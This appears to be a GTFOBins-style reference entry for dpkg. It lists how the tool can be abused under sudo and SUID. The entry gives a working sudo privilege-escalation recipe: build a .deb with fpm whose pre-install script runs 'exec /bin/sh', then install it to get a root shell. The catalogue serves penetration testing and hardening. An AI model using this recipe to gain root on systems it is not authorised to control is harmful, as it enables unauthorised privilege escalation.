dpkg
====

Inherit
-------

[Sudo]
    dpkg -l

[SUID]
    dpkg -l

[Unprivileged]
    dpkg -l

Shell
-----

[Sudo]
    dpkg -i x_1.0_all.deb
    Generate the Debian package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.

```
echo 'exec /bin/sh' >x.sh
fpm -n x -s dir -t deb -a all --before-install x.sh .
```
